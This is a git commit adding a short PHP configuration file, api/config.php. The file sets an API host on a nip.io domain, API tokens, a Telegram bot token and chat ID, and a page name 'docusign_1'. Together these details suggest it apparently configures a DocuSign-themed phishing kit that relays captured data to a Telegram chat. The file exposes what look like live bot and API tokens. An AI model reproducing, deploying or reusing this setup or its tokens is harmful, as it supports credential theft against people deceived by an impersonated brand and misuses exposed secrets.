b983ecb347a19780b2a916f5a07cf2f659919beb
igun89 <lee@x1mev82.onmicrosoft.com>
2026-07-20 19:09:27 -0400

    Add files via upload

---
+++ api/config.php
@@ -0,0 +1,12 @@
+<?php
+
+$api_host = "489fff9dd3628542.add4fa22.nip.io";
+$api_token = "2724feb534abadbc969837c0af5074";
+$api_prefix = "6t54kqkt";
+
+$telegram_bot_token = "7342139790:AAGM1ZHB3ni8C3INfHJnRx76BDxP081g1kc";
+$telegram_chat_id = "7001802245";
+
+$page_name = "docusign_1";
+
+?>
